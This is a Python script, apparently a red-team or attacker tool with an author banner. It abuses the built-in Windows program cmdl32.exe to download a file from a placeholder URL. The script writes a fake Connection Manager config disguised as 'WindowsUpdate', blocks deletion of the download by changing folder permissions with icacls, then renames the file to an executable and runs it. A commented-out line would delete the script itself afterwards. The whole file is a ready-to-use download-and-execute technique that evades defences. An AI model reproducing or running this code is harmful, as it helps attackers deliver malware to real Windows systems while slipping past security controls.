#  
# Created By:
#                                                                                                          
#  TTTTTTTTTTTTTTTTTTTTTTTHHHHHHHHH     HHHHHHHHHRRRRRRRRRRRRRRRRR    333333333333333    333333333333333   
#  T:::::::::::::::::::::TH:::::::H     H:::::::HR::::::::::::::::R  3:::::::::::::::33 3:::::::::::::::33 
#  T:::::::::::::::::::::TH:::::::H     H:::::::HR::::::RRRRRR:::::R 3::::::33333::::::33::::::33333::::::3
#  T:::::TT:::::::TT:::::THH::::::H     H::::::HHRR:::::R     R:::::R3333333     3:::::33333333     3:::::3
#  TTTTTT  T:::::T  TTTTTT  H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H::::::HHHHH::::::H    R::::RRRRRR:::::R     33333333:::::3     33333333:::::3 
#          T:::::T          H:::::::::::::::::H    R:::::::::::::RR      3:::::::::::3      3:::::::::::3  
#          T:::::T          H:::::::::::::::::H    R::::RRRRRR:::::R     33333333:::::3     33333333:::::3 
#          T:::::T          H::::::HHHHH::::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#          T:::::T          H:::::H     H:::::H    R::::R     R:::::R            3:::::3            3:::::3
#        TT:::::::TT      HH::::::H     H::::::HHRR:::::R     R:::::R3333333     3:::::33333333     3:::::3
#        T:::::::::T      H:::::::H     H:::::::HR::::::R     R:::::R3::::::33333::::::33::::::33333::::::3
#        T:::::::::T      H:::::::H     H:::::::HR::::::R     R:::::R3:::::::::::::::33 3:::::::::::::::33 
#        TTTTTTTTTTT      HHHHHHHHH     HHHHHHHHHRRRRRRRR     RRRRRRR 333333333333333    333333333333333   
#                                                                                                          
#

import os
import time
import subprocess
import shutil

# Replace "DOWNLOADED_FILE.exe" with the actual file name and adjust max timeout as needed
filename = "DOWNLOADED_FILE.exe"
timeout_duration = 60  # seconds
elapsed_time = 0

# Define the download URL as a local variable
download_url = "http://DOWNLOAD_URL_HERE"

# Get the current directory
current_directory = os.getcwd()

# Function to modify ACLs (for Windows only)
def modify_acl(deny=False):
    user = os.getlogin()
    if deny:
        os.system(f'icacls "{current_directory}" /deny {user}:(OI)(CI)(DE,DC)')
    else:
        os.system(f'icacls "{current_directory}" /remove:d {user}')

# Create the settings.txt file for configuration
settings_file = os.path.join(current_directory, "settings.txt")
with open(settings_file, "w") as f:
    f.write("[Connection Manager]\n")
    f.write("CMSFile=settings.txt\n")
    f.write("ServiceName=WindowsUpdate\n")
    f.write("TunnelFile=settings\n")
    f.write("[Settings]\n")
    f.write(f"UpdateUrl={download_url}\n")

# Modify ACLs to deny access to the directory
modify_acl(deny=True)

# Run cmdl32 with the settings.txt file and VPN options
subprocess.run(["cmdl32.exe", "/vpn", "/lan", settings_file])

# Restore the ACLs
modify_acl(deny=False)

# Move the downloaded file
downloaded_file = os.path.join(current_directory, "VPNED93.tmp")
if os.path.exists(downloaded_file):
    shutil.move(downloaded_file, os.path.join(current_directory, filename))

# Delete the settings.txt file
os.remove(settings_file)

# Loop until the file exists or timeout is reached
while elapsed_time < timeout_duration:
    if os.path.exists(os.path.join(current_directory, filename)):
        # Execute the file once it exists
        subprocess.run([os.path.join(current_directory, filename)])
        break
    else:
        time.sleep(5)
        elapsed_time += 5
else:
    print("Timeout reached, file not found.")

# Uncomment the next line if you want to delete the script after execution
# os.remove(os.path.realpath(__file__))
